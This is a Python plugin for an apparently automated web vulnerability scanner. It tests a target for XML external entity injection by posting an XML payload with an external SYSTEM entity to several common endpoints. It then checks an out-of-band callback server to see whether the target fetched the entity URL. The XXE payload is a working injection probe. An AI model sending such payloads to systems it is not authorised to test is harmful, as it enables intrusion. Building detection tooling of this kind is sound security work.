
from dataclasses import dataclass, field
from typing import Dict, Any, List, Optional
import aiohttp

CAPS={"passive": False, "active": True, "requires_auth": False, "oast": True, "dangerous": False}

@dataclass
class Finding:
    title: str
    description: str
    severity: str
    evidence: Dict[str, Any] = field(default_factory=dict)
    plugin: str = "xxe_oast_probe"

ENDPOINTS=["/xml","/api/xml","/soap","/upload"]

try:
    from utils.oast_client import OASTClient as _OAST
except Exception:
    _OAST=None

class Plugin:
    def __init__(self, target: str, session: aiohttp.ClientSession, config: dict):
        self.target=target.rstrip('/'); self.session=session; self.config=config
        self.oast = config.get("oast_client") or (_OAST() if _OAST else None)

    async def run(self)->List[Finding]:
        out: List[Finding] = []
        if not self.oast:
            return out
        payload_url = getattr(self.oast, "get_payload", lambda: None)()
        if not payload_url:
            return out
        xml = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [ <!ENTITY xxe SYSTEM "{payload_url}"> ]>
<data>&xxe;</data>"""
        for ep in ENDPOINTS:
            url=self.target+ep
            try:
                async with self.session.post(url, data=xml.encode(), headers={"Content-Type":"application/xml"}) as r:
                    _=await r.text()
            except Exception:
                continue
        try:
            interacted = await self.oast.check_interactions()
        except Exception:
            interacted = False
        if interacted:
            out.append(Finding("XXE via OAST Confirmed", "Server fetched our external entity", "Critical",
                               {"oast": payload_url}))
        return out
